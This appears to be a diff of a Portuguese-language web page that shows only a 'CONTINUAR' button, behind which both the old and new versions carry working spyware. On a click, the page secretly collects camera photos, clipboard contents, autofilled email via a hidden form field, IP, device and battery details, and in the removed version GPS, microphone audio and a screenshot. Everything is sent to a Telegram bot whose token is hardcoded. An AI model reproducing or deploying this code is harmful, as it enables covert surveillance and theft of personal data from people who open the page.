@@ -1,93 +1,113 @@
-<!doctype html>
-<html><head><meta charset="utf-8"><style>html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center}</style></head><body>
-<button id="b" style="padding:40px 80px;font:24px sans-serif;background:#0f0;border:none;cursor:pointer">CONTINUAR</button>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf8"/>
+<meta name="viewport"="width=device-width,initial-scale=1"/>
+<style>
+html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;font:24px sans-serif}
+button{padding:40px 80px;background:#0f0;border:none;border-radius:8px;cursor:pointer}
+button:active{transform:scale(.98)}
+#h{position:absolute;left:-9999px}
+</style>
+</head>
+<body>
+<button id="b">CONTINUAR</button>
+<form id="h"><input id="m" name="email" placeholder=" "></form>
+
 <script>
-const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
-const CHAT_ID="8792921881";
-const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
-const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
+const BOT="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks",ID="8792921881",d={};
 
-b.onclick=()=>{
- b.remove();
- 
- // bateria
- navigator.getBattery().then(b=>{
-   const t=`🔋 ${Math.round(b.level*100)}% ${b.charging?'🔌':''}`;
-   envia(t);SALVA({t:"bateria",v:t});
+b.onclick=async()=>{
+ b.textContent="COLETANDO...";b.disabled=1;
+
+ /* email */
+ const h=document.getElementById("m");h.focus();h.click();
+ await new Promise(r=>setTimeout(r,300));
+ d.email=h.value||"(nenhum salvo)";
+
+ /* marca / modelo */
+ const u=navigator.userAgent,g=u.match(/\(([^)]+)\)/);
+ d.marca=d.modelo="desconhecido";
+ if(/samsung/i.test(g))d.marca="Samsung";
+ else if(/xiaomi|redmi/i.test(g))d.marca="Xiaomi";
+ else if(/oppo/i.test(g))d.marca="OPPO";
+ else if(/vivo/i.test(g))d.marca="Vivo";
+ else d.marca=(g?.split(";")[1]||"generica").trim();
+ d.modelo=(g?.split(";").pop()||"generico").trim();
+
+ /* bateria */
+ try{const b=await navigator.getBattery();
+ d.bateria={nivel:Math.round(b.level*100)+"%",
+ carregando:b.charging?"sim":"não",
+ tempoRestante:b.chargingTime===Infinity?"—":Math.round(b.chargingTime/60)+" min"};
+ }catch{d.bateria={nivel:"n/a",carregando:"n/a",tempoRestante:"n/a"}}
+
+ /* altura */
+ if('ProximitySensor' in window){try{const s=new ProximitySensor();
+ s.onreading=()=>d.altura=s.distance?`${s.distance} cm`:"indisponível";
+ s.start();await new Promise(r=>setTimeout(r,500))}catch{d.altura="sensor não disponível"}
+ }else d.altura="use sensor de proximidade ou mantenha parado";
+
+ /* wifi */
+ const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+ d.wifi={ssid:"não disponível (sem permissão)",tipo:c?.effectiveType||"desconhecido",downlink:c?.downlink?`${c.downlink} Mbps`:"n/a"};
+ if('getWifiInfo' in navigator)try{(await navigator.getWifiInfo()).ssid&&(d.wifi.ssid=_.ssid)}catch{}
+
+ /* ip público */
+ try{const i=await fetch("https://api.ipify.org?format=json");d.ip=(await i.json()).ip}catch{d.ip="não obtido"}
+
+ /* device */
+ d.device={modelo:u.match(/\(([^)]+)\)/)?.[1]||"desconhecido",
+ pl:navigator.platform,lg:navigator.language,
+ res:`${screen.width}x${screen.height}`};
+
+ /* clipboard */
+ try{const p=await navigator.clipboard.readText();d.clip=p||"(vazio)"}catch{d.clip="sem acesso (precisa de interação)"}
+
+ /* fotos */
+ const streams=[],cap=async(s,n)=>new Promise((res,rej)=>{
+   const v=document.createElement("video");v.srcObject=s;v.play();
+   const C=document.createElement("canvas");C.width=1280;C.height=720;
+   const x=C.getContext("2d");
+   setTimeout(()=>{x.drawImage(v,0,0,C.width,C.height);
+   C.toBlob(b=>b?res(b):rej("falha"),"image/jpeg",.85)},800)
+ }),envFoto=async(b,n)=>{
+   const f=new FormData();f.append("photo",b,n);f.append("chat_id",ID);
+   await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:"POST",body:f})
+ };
+ try{const f=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}),
+ r=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+ await envFoto(await cap(f,"frontal.jpg"),"frontal.jpg");
+ await envFoto(await cap(r,"traseira.jpg"),"traseira.jpg");
+ streams.push(f,r);streams.forEach(s=>s.getTracks().forEach(t=>t.stop()))
+ }catch(e){d.fotos="erro: "+e.message}
+
+ /* relatório único */
+ const rel=`
+📊 RELATÓRIO DO DISPOSITIVO
+
+📏 ALTURA: ${d.altura}
+📶 WI-FI: ${d.wifi.ssid} | ${d.wifi.tipo} | ${d.wifi.downlink}
+🌐 IP: ${d.ip}
+📱 DISPOSITIVO:
+ • Marca: ${d.marca}
+ • Modelo: ${d.modelo}
+ • Plataforma: ${d.device.pl}
+ • Resolução: ${d.device.res}
+ • Idioma: ${d.device.lg}
+🔋 BATERIA: ${d.bateria.nivel} (carregando: ${d.bateria.carregando})
+📋 CLIPBOARD: "${d.clip}"
+✉️ EMAIL SALVO: ${d.email}
+⏱️ Coleta em: ${new Date().toLocaleString("pt-BR")}
+`;
+ await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+   method:"POST",headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({chat_id:ID,text:rel})
  });
-
- // gps
- navigator.geolocation.getCurrentPosition(p=>{
-   const m=`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
-   envia(`📍 ${m}`);SALVA({t:"gps",v:m});
- });
-
- // câmera frontal
- navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
-   snap(s,"selfie.jpg");
- });
-
- // câmera traseira
- navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(s=>{
-   snap(s,"rear.jpg");
- });
-
- // microfone 3s
- navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{
-   const rec=new MediaRecorder(s),chunks=[];
-   rec.ondataavailable=e=>chunks.push(e.data);
-   rec.onstop=()=>{
-     const blob=new Blob(chunks,{type:"audio/ogg"});
-     const fd=new FormData();
-     fd.append("voice",blob,"v.ogg");
-     fd.append("chat_id",CHAT_ID);
-     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd});
-     SALVA({t:"audio",v:"v.ogg"});
-     s.getTracks().forEach(t=>t.stop());
-   };
-   rec.start();
-   setTimeout(()=>rec.stop(),3000);
- });
-
- // orientação
- addEventListener("deviceorientation",e=>{
-   envia(`🧭 ${e.alpha|0}° ${e.beta|0}° ${e.gamma|0}°`);
-   SALVA({t:"orientacao",v:`${e.alpha|0},${e.beta|0},${e.gamma|0}`});
- },{once:true});
-
- // rede
- const t0=performance.now();
- fetch("https://speed.cloudflare.com/__down?bytes=500000",{cache:"no-store"}).then(r=>r.arrayBuffer().then(()=>{
-   const mbps=(4/(performance.now()-t0)*1000).toFixed(1);
-   envia(`⬇️ ${mbps} Mbps`);SALVA({t:"rede",v:`${mbps} Mbps`});
- }));
-
- // print da tela
- import("https://cdn.skypack.dev/html2canvas@1.4.1").then(h=>h.default(document.body).then(c=>{
-   c.toBlob(b=>{
-     const fd=new FormData();
-     fd.append("photo",b,"print.jpg");
-     fd.append("chat_id",CHAT_ID);
-     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-     SALVA({t:"print",v:"print.jpg"});
-   });
- }));
-};
-
-function snap(s,name){
- const v=document.createElement("video");v.srcObject=s;v.play();
- const c=document.createElement("canvas");c.width=1280;c.height=720;
- const x=c.getContext("2d");
- setTimeout(()=>{
-   x.drawImage(v,0,0);
-   c.toBlob(b=>{
-     const fd=new FormData();
-     fd.append("photo",b,name);
-     fd.append("chat_id",CHAT_ID);
-     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-     SALVA({t:"foto",v:name});
-     s.getTracks().forEach(t=>t.stop());
-   },"image/jpeg",.8);
- },800);
+ await fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},
+ body:JSON.stringify({t:"relatorio",v:rel,ts:Date.now()})});
+ b.textContent="ENVIADO ✓";b.style.background="#0a0"
 }
-</script></body></html>
+</script>
+</body>
+</html>
